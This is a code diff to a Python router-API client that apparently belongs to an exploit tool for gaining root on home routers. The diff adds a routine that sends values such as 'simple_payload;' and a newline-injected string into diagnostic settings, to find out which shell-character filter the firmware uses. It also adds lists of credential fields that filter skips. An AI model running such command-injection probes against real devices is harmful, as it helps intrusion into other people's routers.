@@ -31,6 +31,8 @@ from multiprocessing import shared_memory
 import xqmodel
 
 
+class ExploitFixed(Exception): pass
+
 class ExploitError(Exception): pass
 
 class ExploitNotWorked(Exception): pass
@@ -79,6 +81,7 @@ class Gateway():
     self.login = 'root' # default username
     self.user_agent = "curl/8.4.0"
     self.last_resp_text = None
+    self.hackCheck = None
   
   def __init__(self, timeout = 4, verbose = 2, detect_device = True, detect_ssh = True, load_cfg = True):
     random.seed()
@@ -145,7 +148,7 @@ class Gateway():
             try:
                 dres = json.loads(response.text)
             except Exception:
-                raise RuntimeError(f'Received inccorrect JSON from "{path}" => {response.text}')
+                raise RuntimeError(f'Received incorrect JSON from "{path}" => {response.text}')
             return dres
     return response
     #return response.status_code, response.content
@@ -357,18 +360,62 @@ class Gateway():
     resp = self.get_diag_paras(timeout = timeout)
     return str(resp['iperf_test_thr'])
 
-  def set_diag_iperf_test_thr(self, iperf_test_thr, timeout = None):
+  def set_diag_paras(self, iperf_test_thr=20, usb_read_thr=0, usb_write_thr=0, disk_read_thr=0, disk_write_thr=0, timeout=None):
     params = {
                 'iperf_test_thr': str(iperf_test_thr),
-                'usb_read_thr': 0,
-                'usb_write_thr': 0,
-                'disk_read_thr': 0,
-                'disk_write_thr': 0,
+                'usb_read_thr':   str(usb_read_thr),
+                'usb_write_thr':  str(usb_write_thr),
+                'disk_read_thr':  str(disk_read_thr),
+                'disk_write_thr': str(disk_write_thr),
              }
     dres = self.api_request('API/xqnetwork/diag_set_paras', params, timeout = timeout)
-    if not dres or dres['code'] != 0:
-        raise RuntimeError(f'Error on exec command "diag_set_paras" => {dres}')
-    return True
+    if not dres:
+        err = f'Error on exec command "diag_set_paras" => {dres} (status:{self.last_resp_code})'
+        if self.last_resp_code == 500:  # Internal Server Error
+            raise EOFError(err)
+        raise RuntimeError(err)
+    return dres['code']  # 0 if OK
+
+  def set_diag_iperf_test_thr(self, value, timeout = None):
+    code = self.set_diag_paras(iperf_test_thr = value, timeout = timeout)
+    return True if code == 0 else False
+
+  hackCheck_skipKeys_v1 = [ "ssid", "pwd", "password", "username" ]
+
+  hackCheck_skipKeys_v2 = [
+    "name", "password", "password5g", "password5g2", "npassword", "pppoeName",
+    "pppoePwd", "pwd", "pwd1", "pwd2", "pwd3", "newPwd", "service", "ssid", "ssid1", "ssid2", "ssid3",
+    "ssid5g", "ssid5g2", "nssid", "nssid5G", "nssid5G2", "username", "apn", "pdp", "user", "passwd",
+    "contact_phone", "phoneList", "msgtext", "acs_username", "acs_password", "conn_username", "conn_password",
+  ]
+
+  def detect_hackCheck(self, update = False):
+    if not update and self.hackCheck is not None:
+        return self.hackCheck
+    self.hackCheck = 0
+    self.set_diag_paras(iperf_test_thr = 25, usb_write_thr = 0, usb_read_thr = 0)
+    try:
+        code = self.set_diag_paras(iperf_test_thr = 25, usb_write_thr = 'simple_payload\n')
+    except EOFError:  # Internal Server Error
+        self.hackCheck = 3  # XQSecureUtil.filterChars = "[=[\n[`;|$&\n]]=]" ; return nil
+        return self.hackCheck
+    try:
+        code = self.set_diag_paras(iperf_test_thr = 25, usb_write_thr = 'simple_payload;', usb_read_thr = 0)
+    except EOFError:  # Internal Server Error
+        self.hackCheck = 2  # XQSecureUtil.filterChars = "[`;|$&]" ; return nil
+        return self.hackCheck
+    code = self.set_diag_paras(iperf_test_thr = 'simple_payload;', usb_write_thr = 11, usb_read_thr = 22)
+    if code != 0:
+        raise RuntimeError(f'Error on exec command "diag_set_paras" => code:{code} (status:{self.last_resp_code})')
+    diag_paras = self.get_diag_paras()
+    #print(f'diag_paras: {diag_paras}')
+    # restore def values
+    self.set_diag_paras(iperf_test_thr = 25, usb_write_thr = 0, usb_read_thr = 0)
+    if isinstance(diag_paras['iperf_test_thr'], int) and diag_paras['iperf_test_thr'] == 25:
+        self.hackCheck = 1  # XQSecureUtil.filterChars = "[`;|$&]" ; return ''
+        return self.hackCheck
+    # hackCheck not detected
+    return self.hackCheck
 
   def wait_shutdown(self, timeout, verbose = 1):
     if verbose:
